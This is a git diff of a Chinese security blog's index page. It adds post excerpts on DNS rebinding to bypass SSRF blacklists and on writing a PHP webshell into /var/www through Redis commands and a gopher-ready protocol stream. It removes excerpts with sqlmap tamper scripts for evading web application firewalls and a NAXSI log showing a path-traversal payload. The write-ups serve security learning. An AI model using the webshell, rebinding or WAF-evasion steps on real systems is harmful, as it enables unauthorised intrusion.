@@ -117,6 +117,226 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/12/06/dns-rebinding.html" >DNS Rebinding</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-12-06  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
+<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
+<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
+<ol>
+<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
+<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
+</ol>
+<p>使用DNS Rebinding的会有这样的攻击效果:</p>
+<ol>
+<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
+<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
+</ol>
+<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
+<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
+<p>根据goychou大神的脚本，测试以下步骤：</p>
+<ul>
+<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
+<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
+<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
+<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
+<ol>
+<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
+<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
+</ol>
+<p>使用DNS Rebinding的会有这样的攻击效果:</p>
+<ol>
+<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
+<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
+</ol>
+<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
+<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
+<p>根据goychou大神的脚本，测试以下步骤：</p>
+<ul>
+<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
+<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-12-05  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Orange在BH大会的paper上面这么说的:</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+  	Elastic, CouchDB, Mongodb, Docker
+  
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
+<ul>
+<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
+<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
+<li>然后再正常使用redis来攻击</li>
+</ul>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
+redis-cli -h 127.0.0.1 config set dbfilename shell.php
+redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后得到的数据流如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">*1\r
+$8\r
+flushall\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$8\r
+&#x2F;var&#x2F;www\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*3\r
+$3\r
+set\r
+$3\r
+web\r
+$18\r
+&lt;?php phpinfo();?&gt;\r
+*1\r
+$4\r
+save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Orange在BH大会的paper上面这么说的:</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+  	Elastic, CouchDB, Mongodb, Docker
+  
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
+<ul>
+<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
+<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
+<li>然后再正常使用redis来攻击</li>
+</ul>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
+<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
+redis-cli -h 127.0.0.1 config set dbfilename shell.php
+redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
+redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后得到的数据流如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">*1\r
+$8\r
+flushall\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$8\r
+&#x2F;var&#x2F;www\r
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+*3\r
+$3\r
+set\r
+$3\r
+web\r
+$18\r
+&lt;?php phpinfo();?&gt;\r
+*1\r
+$4\r
+save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/11/28/sql-bypass-unknown.html" >SQL注入绕过未知字段名的技巧</a>
 		</h3>
 		</div>
@@ -491,472 +711,6 @@ CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="li
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/10/30/bypass-sql-firewall.html" >bypass firewall</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-10-30  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>狗的绕过比较简单，还是写一下：</p>
-<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
-<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;doc&#x2F;COPYING&#39; for copying permission
-&quot;&quot;&quot;
-
-from lib.core.enums import PRIORITY
-
-__priority__ &#x3D; PRIORITY.LOW
-
-def dependencies():
-    pass
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;
-
-    Tested against:
-        * Microsoft SQL Server 2005
-        * MySQL 4, 5.0 and 5.5
-        * Oracle 10g
-        * PostgreSQL 8.3, 8.4, 9.0
-
-    Notes:
-        * Useful to bypass weak and bespoke web application firewalls
-
-    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
-    &quot;&quot;&quot;
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; &quot;&quot;
-        quote, doublequote, firstspace &#x3D; False, False, False
-
-        for i in xrange(len(payload)):
-            if not firstspace:
-                if payload[i].isspace():
-                    firstspace &#x3D; True
-                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                    continue
-
-            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
-                quote &#x3D; not quote
-
-            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
-                doublequote &#x3D; not doublequote
-
-            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
-                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                continue
-
-            retVal +&#x3D; payload[i]
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;LICENSE&#39; for copying permission
-&quot;&quot;&quot;
-
-import os
-import re
-
-from lib.core.common import singleTimeWarnMessage
-from lib.core.data import kb
-from lib.core.enums import DBMS
-from lib.core.enums import PRIORITY
-from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
-
-__priority__ &#x3D; PRIORITY.HIGHER
-
-def dependencies():
-    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Adds versioned MySQL comment before each keyword
-
-    Requirement:
-        * MySQL &lt; 5.1
-
-    Tested against:
-        * MySQL 4.0.18, 5.0.22
-
-    Notes:
-        * Useful to bypass several web application firewalls when the
-          back-end database management system is MySQL
-        * Used during the ModSecurity SQL injection challenge,
-          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html
-
-    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
-    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
-    &quot;&quot;&quot;
-
-    def process(match):
-        word &#x3D; match.group(&#39;word&#39;)
-        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
-            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
-        else:
-            return match.group()
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
-        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<blockquote>
-<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
-</blockquote>
-<p>比如mysql版本是5.5.53:</p>
-<blockquote>
-<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
-</blockquote>
-<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
-	
-
-	</div>
-  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>狗的绕过比较简单，还是写一下：</p>
-<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
-<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;doc&#x2F;COPYING&#39; for copying permission
-&quot;&quot;&quot;
-
-from lib.core.enums import PRIORITY
-
-__priority__ &#x3D; PRIORITY.LOW
-
-def dependencies():
-    pass
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;
-
-    Tested against:
-        * Microsoft SQL Server 2005
-        * MySQL 4, 5.0 and 5.5
-        * Oracle 10g
-        * PostgreSQL 8.3, 8.4, 9.0
-
-    Notes:
-        * Useful to bypass weak and bespoke web application firewalls
-
-    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
-    &quot;&quot;&quot;
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; &quot;&quot;
-        quote, doublequote, firstspace &#x3D; False, False, False
-
-        for i in xrange(len(payload)):
-            if not firstspace:
-                if payload[i].isspace():
-                    firstspace &#x3D; True
-                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                    continue
-
-            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
-                quote &#x3D; not quote
-
-            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
-                doublequote &#x3D; not doublequote
-
-            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
-                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                continue
-
-            retVal +&#x3D; payload[i]
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;LICENSE&#39; for copying permission
-&quot;&quot;&quot;
-
-import os
-import re
-
-from lib.core.common import singleTimeWarnMessage
-from lib.core.data import kb
-from lib.core.enums import DBMS
-from lib.core.enums import PRIORITY
-from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
-
-__priority__ &#x3D; PRIORITY.HIGHER
-
-def dependencies():
-    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Adds versioned MySQL comment before each keyword
-
-    Requirement:
-        * MySQL &lt; 5.1
-
-    Tested against:
-        * MySQL 4.0.18, 5.0.22
-
-    Notes:
-        * Useful to bypass several web application firewalls when the
-          back-end database management system is MySQL
-        * Used during the ModSecurity SQL injection challenge,
-          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html
-
-    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
-    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
-    &quot;&quot;&quot;
-
-    def process(match):
-        word &#x3D; match.group(&#39;word&#39;)
-        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
-            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
-        else:
-            return match.group()
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
-        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<blockquote>
-<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
-</blockquote>
-<p>比如mysql版本是5.5.53:</p>
-<blockquote>
-<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
-</blockquote>
-<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
-	
-	</div>
-  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/10/25/naxsi-elk.html" >NAXSI和ELK</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-10-25  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>NAXSI防火墙介绍: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p>
-<p>过滤XSS，SQL注入，文件上传，文件遍历</p>
-<p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p>
-<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
-2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p>
-<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
-logstash&gt; cd pattern
-logstash&gt; vim naxsi
-DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
-TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
-LEVEL (\w+)
-NUM1 \d+(?:#0: \*)
-NUM2 \d+
-EXLOG NAXSI_EXLOG
-FMT NAXSI_FMT
-ID1 (\d+)
-ZONE \w+
-VAR1  (.*)
-CONTENT (.*)
-T3 \w+
-T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
-HOST (.*)
-NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
-NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
-NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
